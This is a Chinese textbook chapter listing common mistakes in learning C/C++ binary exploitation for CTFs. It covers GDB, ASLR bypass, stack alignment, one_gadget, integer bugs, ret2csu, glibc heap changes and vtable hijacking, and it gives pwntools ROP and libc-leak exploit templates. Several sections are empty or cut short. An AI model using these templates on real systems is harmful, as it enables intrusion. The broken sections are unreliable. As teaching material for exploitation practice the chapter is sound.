# 第09章 常见误区——C/C++安全研究中的陷阱

在C/C++安全研究（PWN）的学习道路上，几乎每个人都会踩进一些"坑"。这些坑有的来自错误的认知，有的来自不良的习惯，有的来自对底层机制的片面理解。本章系统梳理安全研究中最常见的误区，帮助你绕过前人走过的弯路，少做无用功，把精力用在刀刃上。

> **阅读建议**：不要跳过任何误区。即使你认为自己已经懂了，也建议通读一遍——很多误区之间存在关联，一个误区往往是另一个误区的根因。

---

## 误区一：只学理论不学实践

### 典型症状

- 能背诵栈溢出的原理，但从没写过一个exploit
- 知道什么是ROP，但从未用ROPgadget找到过一条可用的链
- 读了十本书，做了零道题
- 看别人的Writeup觉得"很简单"，自己动手时完全不知从何下手

### 根因分析

安全研究是一门**实操学科**，不是纯理论学科。你不能通过阅读游泳教材学会游泳，同样不能通过阅读《黑客攻防技术宝典》学会PWN。理论告诉你"为什么"，实践告诉你"怎么做"——两者缺一不可，但实践的权重必须远大于理论。

### 正确做法

| 维度 | 具体行动 | 频率 |
|------|---------|------|
| 理论学习 | 阅读书籍、文档、论文 | 每天1小时 |
| 代码编写 | 独立编写exploit、工具脚本 | 每天2-3小时 |
| GDB调试 | 用调试器验证每一步操作 | 每次编写exploit时 |
| 题目练习 | 在CTF平台上做题 | 持续进行 |
| 笔记整理 | 记录调试观察、踩坑经历 | 每天30分钟 |

### 学习比例建议

```text
理论学习 : 动手实践 = 3 : 7

初学者阶段（前3个月）：
  - 理论学习：20%（够用就行，不要贪多）
  - 动手做题：50%（从最简单的开始）
  - GDB调试：20%（验证每一个知识点）
  - 总结复盘：10%

进阶阶段（3-12个月）：
  - 理论学习：30%（深入底层机制）
  - 动手做题：40%（挑战中等难度）
  - 工具开发：20%（写自己的辅助脚本）
  - 总结分享：10%（写Writeup、做分享）
```

### 关键原则

**"每学一个概念，立刻用GDB调试验证"**——这不是口号，而是必须严格执行的学习纪律。例如：

- 学了栈布局？立刻写一个带多个局部变量的程序，用GDB观察栈帧
- 学了GOT/PLT？立刻用`objdump -R`查看GOT表，用GDB追踪PLT跳转
- 学了ret2libc？立刻在本地搭建环境完成一次完整的利用

## 误区二：忽视GDB调试

### 典型症状

- 写exploit时全靠"猜"偏移和地址
- exploit失败后不知道哪里出了问题
- 只用`printf`或`gdb --batch`做简单调试
- 不知道pwndbg/gef的存在，或者装了但不会用

### 根因分析

GDB不是"可选的调试工具"，而是安全研究者最重要的武器。你写的每一行exploit代码，都必须在GDB中逐字节验证。不调试就写exploit，就像不看地基就盖楼——迟早要塌。

### 必须掌握的GDB技能

```bash
# 1. 断点管理
b *0x401234          # 在指定地址下断点
b *main+42           # 在main函数偏移42字节处下断点
b system             # 在libc的system函数下断点
info breakpoints     # 查看所有断点
delete 1             # 删除编号为1的断点

# 2. 执行控制
run                  # 运行程序
run < payload.txt    # 用文件作为输入运行（关键！写exploit常用）
continue             # 继续执行
si                   # 单步执行一条指令（step instruction）
ni                   # 单步执行但不进入函数（next instruction）

# 3. 内存查看（pwndbg增强命令）
stack 20             # 查看栈上20个值
heap                 # 查看堆信息
vmmap                # 查看内存映射（关键！找libc基址必用）
telescope $rsp 30    # 从RSP开始查看30个值（带指针追踪）

# 4. 寄存器操作
info registers       # 查看所有寄存器
set $rax = 0         # 修改寄存器值
p/x $rsp             # 以十六进制打印RSP
```

### GDB插件选择

| 插件 | 优势 | 劣势 | 推荐场景 |
|------|------|------|---------|
| **pwndbg** | 功能全面，堆分析强大，社区活跃 | 启动稍慢 | 日常开发首选 |
| **gef** | 轻量级，启动快，自带one_gadget | 堆分析不如pwndbg | 快速调试 |
| **peda** | 经典，学习资料多 | 更新较少，功能较旧 | 入门学习 |

**建议**：pwndbg + gef共存，通过`gdb-pwndbg`和`gdb-gef`两个别名切换使用。

### 调试习惯清单

- **每个exploit都用GDB验证**：确认偏移正确、地址正确、payload构造正确
- **观察栈帧变化**：溢出前后对比，确认覆盖了返回地址
- **追踪指针链**：从指针到实际数据，逐层解引用，确认写入位置
- **记录关键地址**：GOT表地址、PLT地址、libc基址、栈地址
- **用`run < payload.txt`测试**：比手动输入更可靠，能精确控制输入内容

### 实战技巧：GDB中验证ROP链

```python
# 在exploit脚本中生成payload
from pwn import *
payload = b'A' * 72
payload += p64(0x401233)  # ret gadget
payload += p64(0x40123a)  # pop rdi; ret
payload += p64(0x404028)  # /bin/sh地址
payload += p64(0x401040)  # system@plt

with open('payload.txt', 'wb') as f:
    f.write(payload)
```

```bash
# 在GDB中验证
gdb ./vuln
b *main+42            # 在ret指令处下断点
run < payload.txt     # 用payload运行
si                    # 单步执行ret
stack 10              # 查看栈，确认ROP链正确
si                    # 执行下一条指令，确认跳转目标
```

## 误区三：不理解地址空间布局随机化（ASLR）

### 典型症状

- 认为"开了ASLR就无法利用"
- 不区分PIE和非PIE程序的地址随机化范围
- 不知道如何泄露地址来绕过ASLR
- 在32位系统上不知道可以用爆破绕过

### 根因分析

ASLR是一个**概率性**保护机制，不是绝对安全。它随机化的只是部分地址段，而且随机化的熵（随机程度）在不同架构上差异很大。理解ASLR的精确行为，是绕过它的前提。

### ASLR随机化范围详解

```text
地址段随机化情况（Linux x86-64）：

┌─────────────────────────────────────────────────────────┐
│ 地址段              │ 无PIE程序    │ 有PIE程序          │
├─────────────────────┼──────────────┼────────────────────┤
│ 程序代码段(.text)    │ 固定不变 ✗   │ 随机化 ✓           │
│ 程序数据段(.data)    │ 固定不变 ✗   │ 随机化 ✓           │
│ 堆 (Heap)           │ 随机化 ✓     │ 随机化 ✓           │
│ 栈 (Stack)          │ 随机化 ✓     │ 随机化 ✓           │
│ libc映射地址        │ 随机化 ✓     │ 随机化 ✓           │
│ vDSO                │ 随机化 ✓     │ 随机化 ✓           │
│ 共享库              │ 随机化 ✓     │ 随机化 ✓           │
└─────────────────────┴──────────────┴────────────────────┘

ASLR熵值对比：
  x86 (32位)：栈熵约19位 → 爆破成功率 1/2^19 ≈ 1/524288
  x86-64：    栈熵约30位 → 爆破基本不可行
  x86-64：    堆熵约28位 → 爆破基本不可行
```

### 绕过ASLR的核心方法

**方法一：信息泄露（最常用）**

通过已有的漏洞（如格式化字符串、部分溢出）泄露某个已知地址，然后计算基址偏移：

```python
from pwn import *

# 泄露libc地址的典型流程
# 步骤1：泄露puts的真实地址（通过puts@plt打印puts@got）
puts_plt = 0x401050
puts_got = 0x404020
pop_rdi  = 0x40123a

payload = b'A' * 72
payload += p64(pop_rdi)     # pop rdi; ret
payload += p64(puts_got)    # GOT表中puts的真实地址
payload += p64(puts_plt)    # 调用puts打印
payload += p64(0x401176)    # 返回到main，进行第二次利用

p.sendline(payload)
leaked = u64(p.recv(6).ljust(8, b'\x00'))
print(f"puts真实地址: {hex(leaked)}")

# 步骤2：计算libc基址
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc_base = leaked - libc.symbols['puts']
print(f"libc基址: {hex(libc_base)}")

# 步骤3：计算目标函数地址
system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))
```

**方法二：部分覆写（Partial Overwrite）**

只覆写地址的低位字节（例如最后12位），因为低位不受ASLR影响：

```python
# 假设已知函数在0x?????5a0，只需要覆写最后1字节
# 256种可能，但很多场景下低位是固定的
payload = b'A' * offset
payload += p8(0xa0)         # 只覆写1字节
# 有1/16的概率跳转到正确地址（4位对齐的情况下）
```

**方法三：利用未随机化的段**

对于非PIE程序，`.plt`、`.got`、`.text`地址固定，可以直接利用：

```python
# 非PIE程序的GOT表地址是固定的
# 可以直接构造ROP链访问GOT中的函数指针
pop_rdi = 0x40123a           # 固定地址
got_puts = 0x404020          # 固定地址
```

**方法四：32位爆破**

32位系统的ASLR熵很小，可以尝试爆破：

```python
# 32位系统堆地址爆破示例
import subprocess
for i in range(1000):
    try:
        result = subprocess.run(['./vuln'], input=payload, timeout=2)
        if result.returncode == 0:
            print(f"成功！第{i}次尝试")
            break
    except:
        continue
```

### 如何检查ASLR状态

```bash
# 查看当前ASLR级别
cat /proc/sys/kernel/randomize_va_space
# 0 = 关闭
# 1 = 部分随机化（栈、堆、vdso）
# 2 = 完全随机化（默认）

# 临时关闭ASLR（调试用）
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

# 恢复ASLR
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```

## 误区四：忽略栈对齐问题

### 典型症状

- exploit看起来逻辑完全正确，但执行时SIGSEGV崩溃
- 崩溃位置在libc内部（如`__libc_start_main`、`system`）
- 有时能成功，有时崩溃——表现为"随机"失败

### 根因分析

x86-64架构要求在调用`call`指令时，栈指针RSP必须是**16字节对齐**的。当RSP不是16的倍数时，某些SSE指令（如`movaps`）会触发`#GP`异常，导致段错误。

`system()`内部会调用`execve()`，而`execve`的某些实现路径使用了`movaps`指令。如果你的ROP链导致进入`system()`时RSP没有16字节对齐，就会崩溃。

### 为什么需要对齐

```text
正常函数调用时的栈布局：
  调用方call func → RSP自动减8 → 进入被调函数时RSP是8的倍数
  → 被调函数push rbp → RSP再减8 → 此时RSP是16的倍数 ✓

ROP链跳转时的栈布局：
  ret gadget跳转 → RSP加8 → 进入目标函数时RSP可能不是16的倍数
  → 需要额外的ret gadget调整 ✓
```

### 解决方案

```python
from pwn import *

# 方案一：添加一个ret gadget（最常用、最可靠）
ret = rop.find_gadget(['ret'])[0]

payload = b'A' * offset
payload += p64(ret)          # 额外的ret，用于栈对齐
payload += p64(pop_rdi)      # 实际ROP链开始
payload += p64(bin_sh)
payload += p64(system)

# 方案二：用gdb确认是否需要对齐
# 在GDB中：
# p/x $rsp & 0xf    → 如果结果是0x8，说明需要对齐
# 如果结果是0x0，说明已经对齐，不需要额外的ret
```

### 对齐规则速查

| 场景 | 是否需要额外ret |
|------|----------------|
| 覆盖返回地址后直接跳转到函数 | 通常需要 |
| 通过`__libc_csu_init`的gadget跳转 | 通常不需要（pop rbx等已经调整了栈） |
| 使用`one_gadget` | 取决于具体约束条件 |
| 32位程序 | 通常不需要（对齐要求不同） |

### 调试对齐问题

```bash
# 在GDB中检查对齐状态
gdb ./vuln
b *system           # 在system函数入口下断点
run < payload.txt
# 命中断点后：
p/x $rsp & 0xf
# 如果输出0x8 → 需要添加ret gadget
# 如果输出0x0 → 不需要

# 如果崩溃在movaps，查看崩溃位置
# 崩溃信息中出现 movaps 相关指令 → 大概率是栈对齐问题
```

## 误区五：不检查编译选项和安全保护

### 典型症状

- 拿到二进制就直接开始分析，不看保护机制
- 花了大量时间构造shellcode，结果发现NX已启用
- 尝试栈溢出，结果被Canary挡住
- 忘记检查程序架构（32位vs64位）

### 根因分析

安全保护机制决定了**利用策略的选择方向**。不检查保护就盲目尝试，就像不看地图就上路——大概率走错方向。checksec应该是你分析任何二进制的**第一步操作**。

### 检查流程

```bash
# 第一步：检查安全保护（必做）
checksec ./vuln
# 或者使用pwntools
python3 -c "from pwn import *; print(ELF('./vuln').checksec())"

# 输出示例：
#     Arch:     amd64-64-little
#     RELRO:    Partial RELRO
#     Stack:    No canary found
#     NX:       NX disabled
#     PIE:      No PIE (0x400000)

# 第二步：检查文件类型
file ./vuln
# 输出：ELF 64-bit LSB executable, x86-64, dynamically linked

# 第三步：检查链接的libc
ldd ./vuln
# 输出：libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6
```

### 保护机制与利用策略对照表

| 保护机制 | 状态 | 对利用的影响 | 应对策略 |
|---------|------|-------------|---------|
| **Canary** | 已启用 | 无法直接覆盖返回地址 | 泄露Canary / 覆盖Canary / 利用其他漏洞 |
| **Canary** | 未启用 | 直接栈溢出 | 标准栈溢出流程 |
| **NX** | 已启用 | 无法执行shellcode | ROP / ret2libc / ret2csu |
| **NX** | 未启用 | 可以注入shellcode | 直接执行shellcode |
| **PIE** | 已启用 | 地址随机化 | 泄露基址 / 部分覆写 |
| **PIE** | 未启用 | 地址固定 | 直接使用固定地址 |
| **Full RELRO** | 已启用 | GOT表只读 | 不能覆写GOT，需要其他方法 |
| **Partial RELRO** | 已启用 | GOT表可写 | GOT覆写是可行的策略 |
| **ASLR** | 已启用 | 栈/堆/libc地址随机 | 泄露地址计算偏移 |

### 策略选择决策树

```text
拿到二进制 → checksec
│
├─ 有Canary？
│   ├─ 是 → 能泄露Canary吗？
│   │       ├─ 能 → 泄露后继续栈溢出
│   │       └─ 不能 → 寻找其他漏洞（格式化字符串/UAF/堆溢出）
│   └─ 否 → 可以直接栈溢出
│
├─ 有NX？
│   ├─ 是 → 有PIE？
│   │       ├─ 是 → 需要先泄露PIE基址 + libc地址
│   │       └─ 否 → 只需泄露libc地址，ret2libc
│   └─ 否 → 可以注入shellcode
│
└─ 有Full RELRO？
    ├─ 是 → GOT不可写，考虑FSOP/SROP/堆利用
    └─ 否 → GOT覆写是可行选项
```

## 误区六：只学一种利用方法

### 典型症状

- 只会栈溢出，遇到堆题就放弃
- 只会ret2libc，不会ROP链构造
- 不了解格式化字符串的写入能力
- 认为"会一种就够了"

### 根因分析

真实世界的漏洞多种多样，CTF比赛也会考察各种利用技术。只掌握一种方法，意味着你的攻击面非常狭窄。更重要的是，很多高级利用技术是多种基础技术的**组合**——不掌握基础，就无法理解高级技术。

### 漏洞利用技术全景

```text
C/C++安全利用技术体系：
│
├── 栈利用
│   ├── 基础栈溢出（覆盖返回地址）
│   ├── 覆盖局部变量
│   ├── Shellcode注入（NX关闭时）
│   ├── ROP链构造
│   │   ├── 简单ROP（pop rdi; ret）
│   │   ├── ret2csu（利用__libc_csu_init通用gadget）
│   │   └── ROPgadget自动化
│   ├── ret2libc（绕过NX）
│   ├── ret2dlresolve（延迟绑定利用）
│   └── Stack Pivot（栈迁移）
│
├── 格式化字符串
│   ├── 信息泄露（%p、%lx、%s读取栈/内存数据）
│   ├── 任意地址写入（%n写入GOT/返回地址）
│   ├── 偏移计算与payload构造
│   └── 与ASLR绕过结合
│
├── 堆利用
│   ├── Fast Bin Attack（Fast Bin链表劫持）
│   ├── Unsorted Bin Attack（利用unsorted bin链表）
│   ├── Tcache Poisoning（glibc 2.26+，防护较少）
│   ├── House of系列
│   │   ├── House of Spirit（伪造堆块）
│   │   ├── House of Lore（small bin劫持）
│   │   ├── House of Force（top chunk劫持）
│   │   ├── House of Einherjar（off-by-one利用）
│   │   └── House of Orange（FSOP + 堆利用）
│   ├── Large Bin Attack
│   └── Safe Linking绕过（glibc 2.32+）
│
├── Use-After-Free (UAF)
│   ├── 控制流劫持（释放后重分配覆盖函数指针）
│   ├── 信息泄露（释放后读取残留数据）
│   ├── Double Free（同一指针释放两次）
│   └── 与堆利用技术结合
│
├── 整数漏洞
│   ├── 整数溢出 → 缓冲区溢出
│   ├── 有符号/无符号混淆 → 负数变大正数
```

## 误区七：不理解One Gadget的正确使用方法

### 典型症状

- 不知道One Gadget的存在
- 知道One Gadget但不理解约束条件
- 选了约束条件不满足的One Gadget，导致exploit不稳定
- 不会调试验证约束条件

### 什么是One Gadget

libc中存在一些代码位置，如果程序执行到这里，且满足特定的**约束条件**，就会直接调用`execve("/bin/sh", NULL, NULL)`获取shell。使用One Gadget可以跳过构造完整ROP链的过程，大幅简化exploit。

### 使用方法详解

```bash
# 安装one_gadget工具（Ruby gem）
gem install one_gadget

# 查找libc中的one gadget
one_gadget /lib/x86_64-linux-gnu/libc.so.6

# 输出示例：
# 0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   rsp & 0xf == 0
#   rcx == NULL
#
# 0x4f432 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL
#
# 0x10a41c execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
```

### 约束条件解析

每个One Gadget都有约束条件，**不是所有One Gadget在任何场景下都能用**：

| 约束条件 | 含义 | 如何满足 |
|---------|------|---------|
| `rsp & 0xf == 0` | RSP必须16字节对齐 | 添加ret gadget |
| `rcx == NULL` | RCX寄存器为0 | 需要pop rcx gadget或运气 |
| `[rsp+0x40] == NULL` | 栈上偏移0x40处为0 | 清理栈或选择合适调用点 |
| `[rsp+0x70] == NULL` | 栈上偏移0x70处为0 | 同上，但偏移更大 |
| `r12 == NULL` | R12寄存器为0 | 需要控制R12 |

### 选择策略

```python
# 步骤1：列出所有one_gadget
one_gadget libc.so.6

# 步骤2：在GDB中验证每个one_gadget的约束条件
# 在调用one_gadget之前的ret指令处下断点
gdb ./vuln
b *main+ret_offset
run < payload

# 步骤3：检查约束
p/x $rcx           # 检查rcx是否为0
p/x $rsp & 0xf     # 检查栈对齐
x/gx $rsp+0x40     # 检查栈上值

# 步骤4：选择满足约束的one_gadget
# 如果都不满足，尝试调试找到能改变约束的方法
# 或者放弃one_gadget，使用完整的ROP链
```

### One Gadget的优劣势

| 优势 | 劣势 |
|------|------|
| exploit代码极其简洁 | 约束条件不一定满足 |
| 只需一个地址即可获取shell | 不同libc版本地址不同 |
| 不需要`/bin/sh`字符串 | 某些场景下完全不可用 |
| 减少ROP链出错概率 | 需要调试验证 |

### 实际应用

```python
from pwn import *

libc = ELF('./libc.so.6')

# 计算one_gadget地址
one_gadget_offset = 0x4f3d5  # 从one_gadget工具获取
libc_base = leaked_addr - libc.symbols['puts']
one_gadget_addr = libc_base + one_gadget_offset

# 使用one_gadget（带栈对齐）
ret = 0x401233
payload = b'A' * offset
payload += p64(ret)               # 栈对齐
payload += p64(one_gadget_addr)   # 跳转到one_gadget
```

## 误区八：不理解整数安全问题

### 典型症状

- 只知道"整数溢出"这个名词，不理解具体场景
- 分不清有符号数和无符号数混用的危害
- 不知道整数溢出可以导致堆溢出或栈溢出
- 忽视`size_t`、`ssize_t`、`int`之间的隐式转换

### 根因分析

整数问题是C/C++中最隐蔽的漏洞类型之一。编译器不会警告有符号/无符号混用，很多整数溢出在运行时悄无声息地发生，不会产生任何错误提示。

### 常见整数陷阱

**陷阱一：有符号/无符号混淆**

```c
// 危险代码
void process_data(int len, char *buf) {
    if (len < 64) {        // len是有符号int，比较正常
        char dest[64];
        memcpy(dest, buf, len);  // 但len可能被用户控制为负数
    }
}

// 如果攻击者传入 len = -1：
// - len < 64 的判断：-1 < 64 → true，通过检查
// - memcpy(dest, buf, -1)：-1被隐式转换为 unsigned → 0xFFFFFFFF
// - 结果：超大拷贝，堆/栈溢出
```

**陷阱二：整数溢出导致大小计算错误**

```c
// 危险代码
size_t total = count * element_size;  // 如果count和element_size都很大
char *buf = malloc(total);            // total可能溢出为小值
// buf分配了小块内存，但后续循环按count写入 → 堆溢出

// 例如：count = 0x40000001, element_size = 4
// total = 0x40000001 * 4 = 0x100000004 → 截断为32位 → 0x4
// malloc(4) 只分配4字节，但后续会写入 0x40000001 * 4 字节
```

**陷阱三：整数截断**

```c
// 危险代码
short len = get_user_input();  // 用户输入 0x10001
// 截断为16位 → len = 0x0001
char buf[1024];
read(fd, buf, len);  // 只读1字节，看起来安全
// 但如果后续用len做其他计算，就可能出问题
```

### 检测方法

```bash
# 使用编译器警告检测整数问题
gcc -Wconversion -Wsign-conversion -Wstrict-overflow=5 vuln.c

# 使用UBSan运行时检测
gcc -fsanitize=undefined vuln.c -o vuln_ubsan
./vuln_ubsan  # 整数溢出会触发运行时警告
```

### 防御与利用视角

```python
# 利用整数溢出的典型流程：
# 1. 找到用户可控的整数参数
# 2. 确定该参数是否参与大小计算、循环边界或memcpy长度
# 3. 计算能触发溢出的值
# 4. 构造payload利用溢出后果（堆溢出/栈溢出/越界读写）

# 示例：整数溢出导致堆溢出
count = 0x40000001
element_size = 4
# 实际分配大小：4字节（溢出后）
# 实际写入大小：0x40000001 * 4 字节
# → 巨大的堆溢出
```

## 误区九：不考虑实际环境差异

### 典型症状

## 误区十二：忽视格式化字符串漏洞的深度

### 典型症状

- 只知道`%x`可以泄露栈数据
- 不知道`%n`可以写入任意地址
- 不理解格式化字符串的偏移计算
- 不知道如何在有PIE的情况下利用

### 格式化字符串的能力矩阵

| 格式符 | 能力 | 安全影响 |
|--------|------|---------|
| `%x` / `%lx` | 读取栈上的数据 | 信息泄露（地址、Canary） |
| `%s` | 读取指针指向的字符串 | 泄露任意内存内容 |
| `%n` | 向地址写入已输出的字符数 | 任意地址写入（最危险） |
| `%hn` | 写入2字节（short） | 精确写入 |
| `%hhn` | 写入1字节（char） | 逐字节写入，最灵活 |
| `%$n` | 指定参数位置 | 精确控制写入目标 |

### 偏移计算方法

```python
# 方法一：手动计算
# 输入 "AAAA%x.%x.%x.%x.%x.%x.%x.%x"

# 那个位置就是偏移量

# 方法二：使用pwntools

# 自动查找偏移

# 或手动

# 找到41414141出现的位置
```

## 误区十三：不理解ret2csu（通用Gadget）

### 典型症状

- 不知道`__libc_csu_init`中存在通用gadget
- 在PIE+ASLR的情况下找不到足够gadget
- 不理解`__libc_csu_init`的初始化过程

### 什么是ret2csu

在大多数动态链接的ELF程序中，`__libc_csu_init`函数包含一组通用的gadget，可以控制`rbx`、`rbp`、`r12`、`r13`、`r14`、`r15`、`rdx`、`rsi`、`rdi`等寄存器。这对于缺乏gadget的程序特别有用。

```asm
; __libc_csu_init 中的gadget（pop部分）
pop rbx
pop rbp
pop r12
pop r13
pop r14
pop r15
ret

; __libc_csu_init 中的gadget（call部分）
mov rdx, r14
mov rsi, r13
mov edi, r12d
call qword [r15 + rbx*8]
add rbx, 1
cmp rbp, rbx
jne <above>
; 然后继续执行
add rsp, 8
pop rbx
pop rbp
pop r12
pop r13
pop r14
pop r15
ret
```

### ret2csu利用模板

```python
from pwn import *

# 找到两个gadget的地址
csu_pop = 0x40123a   # pop rbx~r15; ret
csu_call = 0x401220  # mov rdx,r14; mov rsi,r13; mov edi,r12d; call [r15+rbx*8]

def ret2csu(rbx, rbp, r12, r13, r14, r15):
    payload  = p64(csu_pop)
    payload += p64(rbx)    # rbx = 0
    payload += p64(rbp)    # rbp = 1（call之后rbx+1=rbp，避免跳转）
    payload += p64(r12)    # r12 → edi（低32位）
    payload += p64(r13)    # r13 → rsi
    payload += p64(r14)    # r14 → rdx
    payload += p64(r15)    # r15 → call的目标地址（函数指针）
    payload += p64(csu_call)
    return payload

# 使用示例：调用 read(0, bss_addr, 0x100)
payload = b'A' * offset
payload += ret2csu(
    rbx=0, rbp=1,
    r12=0,           # fd = 0 (stdin)
    r13=0x100,       # size = 0x100
    r14=bss_addr,    # buf = bss地址（需要可写）
    r15=got_read     # call [r15] → 调用read
)
```

## 误区十四：堆利用中的常见陷阱

### 陷阱一：不理解glibc版本差异

不同glibc版本的堆实现差异巨大，直接影响利用方法：

| glibc版本 | 关键变化 | 利用影响 |
|-----------|---------|---------|
| < 2.26 | 无Tcache | 只能用Fast Bin/Unsorted Bin |
| 2.26-2.28 | Tcache引入，无防护 | Tcache Double Free最容易 |
| 2.29 | 加入对Unsorted Bin的检查 | Unsorted Bin Attack受限 |
| 2.31 | 加入tcache key检查 | Double Free需要绕过tcache key |
| 2.32 | Safe Linking引入 | Tcache/Fast Bin指针被XOR混淆 |
| 2.34 | 移除malloc_hook/free_hook | 不能通过覆写hook劫持控制流 |
| 2.35+ | 更多防护 | 需要FSOP或vtable劫持 |

### 陷阱二：忽视Chunk对齐和头部大小

```python
# 在64位系统上：
# - chunk最小大小：0x20（头部0x10 + 最小数据0x10）
# - 所有chunk大小必须是0x10的倍数
# - 实际分配大小 = 请求大小 + 0x10（头部）向上对齐到0x10的倍数

# 例如：malloc(0x18)
# 实际chunk大小 = 0x18 + 0x10 = 0x28 → 向上对齐 → 0x30

# 例如：malloc(0x28)
# 实际chunk大小 = 0x28 + 0x10 = 0x38 → 向上对齐 → 0x40
```

### 陷阱三：Tcache Safe Linking绕过（glibc 2.32+）

```python
# Safe Linking：Tcache和Fast Bin的fd指针被混淆
# 混淆公式：PROTECT_PTR(pos, ptr) = (pos >> 12) ^ ptr
# 反混淆：REVEAL_PTR(ptr) = (pos >> 12) ^ ptr

# 利用时需要知道chunk地址才能计算真实指针
# 绕过方法：泄露堆地址，然后计算

# 示例：
chunk_addr = 0x5555555592a0
fake_fd = target_addr ^ (chunk_addr >> 12)
# 将fake_fd写入chunk的fd字段
```

### 陷阱四：glibc 2.34+ 不能用malloc_hook

```python
# glibc 2.34移除了malloc_hook和free_hook
# 之前的方法（覆写__malloc_hook为one_gadget）不再可用

# 替代方案：
# 1. FSOP：利用_IO_FILE结构体劫持控制流
# 2. vtable劫持：伪造C++虚函数表
```

## 误区十五：不重视C++特有的安全问题

### 典型症状

- 只关注C语言的漏洞，忽视C++的特有攻击面
- 不理解虚函数表（vtable）的工作原理
- 不知道如何通过覆写vtable实现控制流劫持

### C++特有的安全问题

**虚函数表劫持**

```cpp
// C++虚函数调用过程
class Base {
public:
    virtual void func1() { /* ... */ }
    virtual void func2() { /* ... */ }
};

// 内存布局：
// +0x00: vptr（指向vtable的指针）
// +0x08: 成员变量...

// vtable布局：
// +0x00: &Base::func1
// +0x08: &Base::func2

// 攻击思路：
// 1. 通过堆溢出/UAF修改对象的vptr
// 2. 指向伪造的vtable
// 3. 伪造的vtable中填入system地址
// 4. 调用虚函数时跳转到system
```

```cpp
// C++异常处理链也可以被利用
```

## 总结：十大误区速查表
